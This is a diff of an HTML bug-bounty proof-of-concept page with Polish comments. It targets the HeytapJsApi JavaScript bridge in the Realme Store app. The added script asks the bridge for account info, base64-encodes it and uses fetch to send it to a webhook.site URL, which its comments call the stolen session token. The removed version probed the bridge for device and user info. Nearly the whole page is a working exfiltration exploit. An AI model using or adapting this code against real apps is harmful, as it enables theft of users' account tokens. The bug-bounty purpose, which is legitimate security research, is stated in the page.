@@ -1,12 +1,29 @@
+<!DOCTYPE html>
 <html>
-    <body style="background-color: lightblue;">
-        <h1>Welcome to my page if you can see that i did good</h1>
-        <script>
-window.HeytapJsApi.callback('test', {});
-window.HeytapJsApi.getDeviceInfo();
-window.HeytapJsApi.getUserInfo();
-window.HeytapJsApi.login();
-window.HeytapJsApi.openPage({"url":"https://robjez9999-dev.github.io/cosr/index.html"});
-</script>
-    </body>
+<head>
+    <title>Strona Testowa Bug Bounty</title>
+</head>
+<body>
+    <h1>Trwa ładowanie zawartości...</h1>
+    <script>
+        window.onload = function() {
+            // 1. Sprawdzamy czy Bridge istnieje
+            if (window.HeytapJsApi) {
+                // 2. Wywołujemy funkcję, która zwraca informacje o koncie
+                // Aplikacja sama odszyfruje dane i poda je nam w 'res'
+                window.HeytapJsApi.invoke('getAccountInfo', {}, function(res) {
+                    // 3. Wysyłamy skradziony token na Twój serwer (np. webhook.site)
+                    var exfiltrateUrl = "https://webhook.site/TWÓJ-UNIKALNY-ID?data=" + btoa(JSON.stringify(res));
+                    
+                    fetch(exfiltrateUrl);
+                    
+                    // Opcjonalnie wyświetlamy alert dla celów PoC (nagranie ekranu)
+                    alert("CRITICAL: Skradziono Token Sesji!\n" + JSON.stringify(res));
+                });
+            } else {
+                document.body.innerHTML += "<p>Błąd: JSBridge nie odnaleziony. Otwórz w aplikacji Realme Store.</p>";
+            }
+        };
+    </script>
+</body>
 </html>
